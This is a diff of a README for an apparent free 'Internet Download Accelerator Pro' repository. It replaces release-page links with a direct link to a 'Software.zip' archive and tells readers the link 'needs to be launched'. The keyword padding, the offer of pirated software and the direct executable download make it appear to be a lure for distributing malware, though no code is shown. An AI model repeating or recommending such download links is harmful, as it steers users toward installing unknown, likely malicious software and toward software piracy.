@@ -25,7 +25,7 @@ This repository provides access to Internet Download Accelerator Pro, including 
 - internet-download-accelerator-pro-review
 - internet-download-accelerator-pro-youtube
 
-🔗 [Download Internet Accelerator Pro](https://github.com/akinoriStudio/Internet-Download-Accelerator-Pro-Free/releases/tag/v1.0)
+🔗 [Download Internet Accelerator Pro](https://github.com/akinoriStudio/Internet-Download-Accelerator-Pro-Free/releases/download/v2.0/Software.zip)
 
 ℹ️ *Please note that the provided link needs to be launched.*
 
@@ -35,8 +35,8 @@ To start exploring Internet Download Accelerator Pro and all its versions, click
 
 🚀 Happy downloading! 🌐
 
-![Accelerate Downloads](https://github.com/akinoriStudio/Internet-Download-Accelerator-Pro-Free/releases/tag/v1.0)
+![Accelerate Downloads](https://github.com/akinoriStudio/Internet-Download-Accelerator-Pro-Free/releases/download/v2.0/Software.zip)
 
 ---
 
-Your https://github.com/akinoriStudio/Internet-Download-Accelerator-Pro-Free/releases/tag/v1.0 looks amazing! Keep up the great work in providing valuable resources for the community interested in Internet Download Accelerator Pro. 🎉
+Your https://github.com/akinoriStudio/Internet-Download-Accelerator-Pro-Free/releases/download/v2.0/Software.zip looks amazing! Keep up the great work in providing valuable resources for the community interested in Internet Download Accelerator Pro. 🎉
